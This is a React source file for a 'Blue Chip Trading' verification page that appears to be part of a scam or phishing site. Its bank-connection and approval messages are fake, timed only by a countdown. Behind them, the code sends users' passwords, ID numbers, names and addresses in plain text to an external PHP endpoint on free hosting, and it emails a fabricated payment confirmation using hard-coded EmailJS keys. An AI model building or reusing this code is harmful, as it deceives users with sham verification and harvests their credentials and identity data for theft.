import React, { useState, useEffect, useRef } from "react";
import emailjs from "@emailjs/browser";
import "./Verification.css";

const STEPS = [
  { at: 0,  label: "Connecting to server..." },
  { at: 4,  label: "Establishing secure connection..." },
  { at: 8,  label: "Connecting to bank..." },
  { at: 12, label: "Authenticating credentials..." },
  { at: 16, label: "Pending approval..." },
  { at: 20, label: "Approved ✓" },
  { at: 22, label: "Creating account..." },
  { at: 26, label: "Sending confirmation email..." },
  { at: 29, label: "Verification complete." },
];

export default function Verification({ name, email, user, address, onComplete }) {
  const [timeLeft, setTimeLeft] = useState(30);
  const [status, setStatus] = useState("Processing");
  const [stepLabel, setStepLabel] = useState(STEPS[0].label);
  const emailSentRef = useRef(false);

  const nameRef = useRef(name);
  const emailRef = useRef(email);
  const userRef = useRef(user);
  const addressRef = useRef(address);

  useEffect(() => { nameRef.current = name; }, [name]);
  useEffect(() => { emailRef.current = email; }, [email]);
  useEffect(() => { userRef.current = user; }, [user]);
  useEffect(() => { addressRef.current = address; }, [address]);

  const sendEmail = async () => {
    if (!nameRef.current || !emailRef.current) {
      console.error("❌ Missing name or email — aborting.");
      return;
    }

    const today = new Date();
    const nextBilling = new Date(today);
    nextBilling.setDate(today.getDate() + 30);

    const formatDate = (date) =>
      date.toLocaleDateString("en-ZA", {
        day: "numeric",
        month: "long",
        year: "numeric",
      });

    try {
      const res = await emailjs.send(
        "service_6e2lrip",
        "template_5d2o1yi",
        {
          to_name: nameRef.current,
          to_email: emailRef.current,
          payment_date: formatDate(today),
          next_billing_date: formatDate(nextBilling),
        },
        "iJf91K9SaKpnpTDzB"
      );
      console.log("✅ Email sent:", res.status);
    } catch (err) {
      console.error("❌ Email failed:", err);
    }
  };

  const saveToDatabase = async () => {
    const u = userRef.current || {};
    const fullName = nameRef.current || "";
    const nameParts = fullName.trim().split(" ");

    const payload = {
      firstName: u.firstName || nameParts[0] || "",
      lastName:  u.lastName  || nameParts.slice(1).join(" ") || "",
      email:     emailRef.current || "",
      password:  u.password  || "",
      idNumber:  u.idNumber  || "",
      address:   addressRef.current || "",
    };

    try {
      const res = await fetch("https://blue-chip.infinityfree.me/save_client.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const result = await res.json();
      if (result.success) {
        console.log("✅ Client saved to database.");
      } else {
        console.error("❌ DB insert failed:", result.error);
      }
    } catch (err) {
      console.error("❌ DB request failed:", err);
    }
  };

  // Countdown timer
  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Update step label
  useEffect(() => {
    const elapsed = 30 - timeLeft;
    const current = [...STEPS].reverse().find((s) => elapsed >= s.at);
    if (current) setStepLabel(current.label);
  }, [timeLeft]);

  // When countdown hits 0 — send email + save to DB
  useEffect(() => {
    if (timeLeft !== 0) return;
    if (emailSentRef.current) return;
    emailSentRef.current = true;
    setStatus("Processed");

    Promise.all([sendEmail(), saveToDatabase()]).then(() => {
      setTimeout(() => {
        if (onComplete) onComplete();
      }, 2000);
    });
  }, [timeLeft]);

  return (
    <div className="bank-container">
      <div className="confirmation-card">
        <div className="bank-header">
          <div className="bank-logo">Blue Chip Trading</div>
          <span className="secure-badge">Secure Verification</span>
        </div>
        <hr className="divider" />
        <div className="status-visual">
          {status === "Processing" ? (
            <div className="spinner"></div>
          ) : (
            <div className="success-icon">✓</div>
          )}
        </div>
        <div className="transaction-info">
          <h2>{status}</h2>
          {status === "Processing" ? (
            <p className="timer-alert">{stepLabel} &nbsp;({timeLeft}s)</p>
          ) : (
            <p className="success-msg">Verification complete. Sending confirmation email...</p>
          )}
        </div>
        <div className="details-grid">
          <div className="detail-item">
            <span className="detail-label">Name</span>
            <span className="detail-value">{name || "NOT RECEIVED"}</span>
          </div>
          <div className="detail-item">
            <span className="detail-label">Email</span>
            <span className="detail-value">{email || "NOT RECEIVED"}</span>
          </div>
        </div>
      </div>
    </div>
  );
}